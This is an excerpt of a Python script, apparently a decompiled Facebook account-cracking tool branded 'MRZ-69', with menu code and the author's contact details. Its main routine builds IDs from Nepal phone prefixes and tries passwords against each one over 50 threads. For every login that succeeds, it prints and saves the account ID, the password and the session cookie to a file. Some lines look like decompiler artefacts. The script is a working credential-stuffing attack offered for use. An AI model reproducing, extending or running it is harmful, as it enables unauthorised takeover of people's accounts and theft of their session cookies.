...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/100007270561664')
        return None
    if None == '3':
        os.system('xdg-open https://github.com/BD-MRZ-KING')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/100007270561664')
        return None
...
\33[1;92m█  \33[mFacebook: \33[1;92Usaanam Ameen
\33[1;92m█  \33[mWhatsApp: \33[1;92m+13346549239
\33[1;92m█  \33[mTools : \33[1;92mFree Tools
\33[1;92m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
...
def i():
    ...
    jalan('\033[1;32mNEPAL CODE - \033[1;34m97797 \033[1;34m97795 \033[1;34m97781 \033[1;34m97787')
    ...
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;32m TOTAL IDS: \033[1;32m'+tl)
        print('\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m THE PROCESS HAS BEEN STARTED')
        print('\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;34m WILL RUN ON ANY NETWORK')
        print('\033[1;32m=====================================================================')
        for love in user:
    ...
    print('IDS SAVED IN MRZ-69.txt, MRZ-69.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mMRZ-69-OK- ]' +uid+ ' | ' +ps+'\033[0;35m')
                print(f"{H}\033[0;35m[COOKIE]'\033[1;32m{coki}")
                cek_apk(session,coki)
                open('/sdcard/MRZ-69-OK.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[MRZ-69] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
